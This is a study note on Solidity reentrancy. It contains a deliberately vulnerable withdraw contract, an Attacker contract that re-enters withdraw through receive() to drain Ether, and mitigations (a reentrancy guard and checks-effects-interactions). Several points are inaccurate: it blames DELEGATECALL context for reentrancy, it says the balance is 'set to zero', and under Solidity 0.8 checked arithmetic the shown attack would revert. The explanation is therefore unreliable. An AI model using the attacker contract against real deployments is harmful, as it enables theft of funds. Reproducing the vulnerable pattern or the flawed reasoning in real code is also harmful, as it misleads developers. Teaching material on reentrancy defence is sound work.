##### [[Reentrancy]]

- When using `DELEGATECALL` in Solidity, the context variables such as `msg.sender`, `msg.value`, and `address(this)` remain tied to the calling contract. This behavior can lead to several issues, particularly reentrancy attack.
- simple contract to withdraw funds, but it mistakenly uses `msg.sender` in a way that can be exploited
```
pragma solidity ^0.8.0;

contract Vulnerable {
    mapping(address => uint256) public balances;

    constructor() {
        balances[msg.sender] = 100; // The contract creator starts with 100 units
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }
}
```

- Attacker's Contract
```
contract Attacker {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // Fallback function to re-enter the withdraw function
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether); // Re-enter the withdraw function
        }
    }

    function attack() public {
        vulnerable.withdraw(1 ether); // Start the attack
    }
}
```
- attacker calls the `attack` func on their `Attacker` contract. This func calls `withdraw(1 ether` on the Vulnerable contract
- Inside the `withdraw` function of `Vulnerable`, it checks if the attacker has enough balance
- It then sends 1 Ether to the attacker's address using `(bool success, ) = msg.sender.call{value: amount}("");`. This line triggers the fallback function in the `Attacker` contract because it's sending Ether to it.
- When the `Attacker` receives Ether, its `receive()` fallback function is automatically called.
- In Solidity, when a contract calls another contract (or itself), it can execute additional code in response to that call. This means that if `msg.sender` is a contract with a fallback function, that function will be executed immediately after sending Ether.
- If the fallback function of the attacker's contract calls `withdraw` again before the original call to `withdraw` has finished executing (i.e., before it updates the state variable), it can repeatedly withdraw funds from the `Vulnerable` contract.
- This happens because the balance check and state update (setting the user's balance to zero) occur **after** sending Ether, allowing multiple withdrawals before the state is updated.
- The state variable `balances[msg.sender]` in the `Vulnerable` contract is only updated after sending Ether, so it still thinks there is enough balance for subsequent calls.

##### How to prevent?
###### 1. Reentrancy Guard
- Introducing locking mechanism that ensures a func cannot be called while it is still executing
```
pragma solidity ^0.8.0;

contract SecureContract {
    bool internal locked; // Lock variable

    modifier noReentrant() {
        require(!locked, "No reentrancy allowed"); // Check if the function is already executing
        locked = true; // Lock the function
        _; // Execute the function
        locked = false; // Unlock after execution
    }

    function withdraw(uint256 amount) external noReentrant {
        // Withdrawal logic here
    }
}
```
###### 2. [[CEI]] Pattern
- The order of operations in your functions to prevent unexpected behavior:
	- **Checks**: Validate conditions (e.g., sufficient balance).
	- **Effects**: Update state variables (e.g., deduct balance).
	- **Interactions**: Make external calls (e.g., transfer Ether).
```
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    balances[msg.sender] -= amount; // Effect: Update state first
    
    (bool success, ) = msg.sender.call{value: amount}(""); // Interaction: Send Ether last
    require(success, "Transfer failed");
}
```

##### 3. Use OpenZepplin's Reentrancy Guard
